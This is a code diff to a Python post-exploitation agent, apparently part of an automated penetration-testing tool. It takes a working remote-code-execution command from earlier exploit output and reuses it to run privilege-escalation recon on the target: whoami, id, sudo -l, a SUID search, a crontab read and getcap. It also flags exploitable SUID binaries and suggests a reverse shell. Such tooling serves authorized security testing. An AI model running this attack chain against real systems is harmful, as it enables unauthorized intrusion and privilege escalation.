@@ -2,7 +2,10 @@
 post_agent.py
 主机攻链后渗透 —— 分阶段：立足后枚举 / 提权尝试 / 目标收集
 
-MSF 会话存在时走远程命令；ReAct/证据模式走输出解析与启发式建议。
+三种执行通道（优先级递减）：
+  1. MSF 会话 → msf.run_session_command
+  2. RCE 模板 → ToolExecutor 复用利用命令在靶机执行
+  3. 证据模式 → 解析利用阶段输出，启发式建议
 """
 from __future__ import annotations
 
@@ -17,6 +20,55 @@ logger = logging.getLogger(__name__)
 
 LogCb = Optional[Callable[[str], Awaitable[None]]]
 RecordCb = Optional[Callable[[dict], Awaitable[None]]]
+
+
+def _extract_rce_template(result: ExploitResult) -> Optional[str]:
+    """Try to extract a reusable RCE command template from exploit records.
+
+    Scans the command history for the successful RCE command (one whose
+    output contained uid=) and returns it with the executed OS command
+    replaced by the placeholder {CMD}.  Returns None if no template
+    can be reconstructed.
+    """
+    records = result.command_records or result.command_results or []
+    for rec in reversed(records):
+        if not isinstance(rec, dict):
+            continue
+        out = rec.get("stdout", "")
+        cmd = rec.get("command", "")
+        if not cmd or not re.search(r"uid=\d+", out):
+            continue
+        # curl-based web RCE: replace the OS command portion
+        # Pattern: system('CMD') or system("CMD") in URL or POST data
+        for pat, repl_fn in [
+            (r"system\(['\"]([^'\"]+)['\"]\)", lambda m: f"system('{{{\"CMD\"}}}')" ),
+            (r"\bcmd=([^\s&\"']+)", lambda m: "cmd={CMD}"),
+            (r"'id'", lambda m: "'{CMD}'"),
+            (r'"id"', lambda m: '"{CMD}"'),
+        ]:
+            import re as _re
+            if _re.search(pat, cmd):
+                template = _re.sub(pat, repl_fn, cmd, count=1)
+                return template
+    return None
+
+
+async def _run_cmd_via_rce(
+    template: str,
+    os_cmd: str,
+    task_id: Optional[str],
+    timeout: int = 30,
+) -> str:
+    """Execute an OS command on the target by substituting into the RCE template."""
+    from backend.tools.executor import ToolExecutor
+    script = template.replace("{CMD}", os_cmd)
+    executor = ToolExecutor()
+    result = await executor.run_script(
+        script_content=script,
+        timeout=timeout,
+        task_id=task_id,
+    )
+    return (result.stdout or "").strip()
 
 
 def _concat_exploit_outputs(results: list[ExploitResult]) -> str:
@@ -292,6 +344,15 @@ class PostExploitAgent:
                 "next_steps": next_steps,
             }
 
+        # No MSF session -- try RCE template if available
+        rce_template = _extract_rce_template(first)
+        if rce_template and first.exploit_level in ("rce", ""):
+            logger.info("[PostAgent] 无 MSF 会话，通过 RCE 模板执行提权侦察")
+            return await self._privesc_via_rce_template(
+                rce_template, first, target_os, task_id, round_num,
+                log_callback=log_callback, record_callback=record_callback,
+            )
+
         blob = _concat_exploit_outputs([first])
         priv = _infer_privilege_from_text(blob)
         return {
@@ -299,13 +360,94 @@ class PostExploitAgent:
             "final_privilege": priv,
             "findings": {
                 "round": round_num,
-                "note": "无交互会话；无法在靶机执行提权命令，仅保留证据级判断",
+                "note": "无交互会话且无可复用 RCE 模板；仅保留证据级判断",
             },
             "next_steps": [{
                 "stage": "privesc",
                 "action": "建立反弹 shell / SSH 后再执行 sudo -l 与 SUID 枚举",
                 "priority": 1,
             }],
+        }
+
+    async def _privesc_via_rce_template(
+        self,
+        template: str,
+        result: ExploitResult,
+        target_os: str,
+        task_id: Optional[str],
+        round_num: int,
+        *,
+        log_callback: LogCb = None,
+        record_callback: RecordCb = None,
+    ) -> dict[str, Any]:
+        """Run privesc recon commands on target via the RCE exploit template."""
+        findings: dict[str, Any] = {"round": round_num, "source": "rce_template"}
+
+        async def _rce(cmd: str) -> str:
+            if log_callback:
+                try:
+                    await log_callback(f"[PostAgent] RCE 模板执行: {cmd}")
+                except Exception:
+                    pass
+            try:
+                return await _run_cmd_via_rce(template, cmd, task_id, timeout=30)
+            except Exception as e:
+                logger.warning(f"[PostAgent] RCE 模板执行失败: {e}")
+                return ""
+
+        whoami_out = await _rce("whoami")
+        id_out = await _rce("id")
+        findings["current_user"] = whoami_out
+        findings["id"] = id_out[:800]
+
+        privilege = "root" if any(
+            x in (whoami_out + id_out).lower() for x in ("root", "uid=0(")
+        ) else "user"
+
+        if privilege != "root" and target_os == "linux":
+            findings["uname"] = (await _rce("uname -a"))[:800]
+            findings["sudo_preview"] = (await _rce("sudo -l 2>/dev/null"))[:600]
+            findings["suid_preview"] = (await _rce(
+                "find / -perm -4000 -type f 2>/dev/null | head -25"
+            ))[:800]
+            findings["crontab"] = (await _rce("cat /etc/crontab 2>/dev/null"))[:400]
+            findings["capabilities"] = (await _rce(
+                "getcap -r / 2>/dev/null | head -20"
+            ))[:400]
+
+            interesting = ["bash", "vim", "nano", "python", "perl", "find",
+                           "nmap", "less", "more", "env", "awk"]
+            suid_out = findings.get("suid_preview", "")
+            found_suid = [b for b in interesting if b in suid_out]
+            sudo_out = findings.get("sudo_preview", "")
+            priv_success = len(found_suid) > 0 or "NOPASSWD" in sudo_out
+            findings["privesc_attempt"] = {
+                "method": "rce_template_recon",
+                "suid_binaries": found_suid,
+                "sudo_rules": sudo_out[:300],
+                "success": priv_success,
+            }
+            if priv_success:
+                privilege = "root"
+
+        hypotheses = []
+        if privilege != "root":
+            hypotheses.append({"vector": "sudo", "detail": "检查 sudo -l 输出", "confidence": 0.4})
+            hypotheses.append({"vector": "suid", "detail": "检查 SUID 列表", "confidence": 0.4})
+            hypotheses.append({"vector": "kernel", "detail": "对照 uname -a 与已知 LPE", "confidence": 0.3})
+        next_steps = []
+        if privilege != "root":
+            next_steps.append({
+                "stage": "privesc",
+                "action": f"第 {round_num} 轮: 基于 SUID/sudo/kernel 结果验证提权",
+                "priority": 2,
+            })
+        return {
+            "status": "ok",
+            "final_privilege": privilege,
+            "findings": findings,
+            "privesc_hypotheses": hypotheses,
+            "next_steps": next_steps,
         }
 
     async def run_objective_collect(
